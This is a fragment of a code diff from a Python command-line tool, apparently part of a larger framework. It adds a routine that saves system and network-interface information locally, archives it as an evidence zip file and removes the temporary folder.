+            'timestamp': datetime.now().isoformat()
+        }
+        
+        with open(os.path.join(evidence_dir, 'sysinfo.json'), 'w') as f:
+            json.dump(sysinfo, f, indent=2)
+        
+        print(f"{Fore.GREEN}[+] System information collected{Style.RESET_ALL}")
+        print(f"{Fore.BLUE}[*] Collecting network information...{Style.RESET_ALL}")
+        try:
+            result = subprocess.run('ifconfig || ip addr', shell=True, capture_output=True, text=True)
+            with open(os.path.join(evidence_dir, 'network.txt'), 'w') as f:
+                f.write(result.stdout)
+            print(f"{Fore.GREEN}[+] Network information collected{Style.RESET_ALL}")
+        except Exception as e:
+            print(f"{Fore.YELLOW}[!] Could not collect network info: {str(e)}{Style.RESET_ALL}")
+        
+        print(f"{Fore.BLUE}[*] Creating archive...{Style.RESET_ALL}")
+        try:
+            with zipfile.ZipFile(output, 'w', zipfile.ZIP_DEFLATED) as zipf:
+                for root, dirs, files in os.walk(evidence_dir):
+                    for file in files:
+                        file_path = os.path.join(root, file)
+                        arcname = os.path.relpath(file_path, evidence_dir)
+                        zipf.write(file_path, arcname)
+            
+            print(f"{Fore.GREEN}[+] Evidence archived: {output}{Style.RESET_ALL}")
+            import shutil
+            shutil.rmtree(evidence_dir)
+        except Exception as e:
+            print(f"{Fore.RED}[!] Error creating archive: {str(e)}{Style.RESET_ALL}")
+    
     def show_stats(self):
         """Show framework statistics"""
         self._render_screen_header("Framework Telemetry", "live signal across pool, rate, sessions, and modules")
